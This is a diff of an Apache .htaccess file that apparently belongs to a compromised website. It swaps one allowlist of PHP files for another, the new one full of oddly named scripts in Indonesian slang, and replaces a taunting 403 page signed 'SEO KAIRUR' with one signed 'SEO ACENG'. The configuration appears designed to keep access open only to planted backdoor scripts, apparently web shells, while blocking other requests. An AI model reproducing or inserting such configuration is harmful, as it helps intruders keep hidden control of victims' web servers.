@@ -58,9 +58,9 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(xmail.php|locale.php|config.inc.php|XHTML.inc.php|locale.php|config.inc.php|HTMLPurifier.inc.php|HTMLPurifier.inc.php|AttrCollections.inc.php|Transformations.inc.php3|AbstractLexer.inc.php|WordInflector.inc.php)$">
+<FilesMatch "^(submission.php|locale.php|walawe.php|array.php|hebatbanget.php|kingmu.php|masasihbangmessi.php|gacor.php|punyaraka.php|punyaraka2.php|kalaugakpercayatanyabangdom.php|punyarakaloh.php|satuptkitanyabang.php|masamasihmaudihantambang.php|ISecurityOpis.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
 Options -Indexes
-ErrorDocument 403 '<center><img src="https://media.tenor.com/qNWbbEtVQ8UAAAAM/bleh-tongue-out.gif"></img> <h3>KENAPA NYAK ??</font><br><h2>by SEO KAIRUR</h2>
+ErrorDocument 403 '<center><img src="https://i.pinimg.com/originals/5f/b8/2f/5fb82f1a66ddbc49211709dfa5f84566.gif"></img> <h3>KENAPA NYAK ??</font><br><h2>by SEO ACENG</h2>
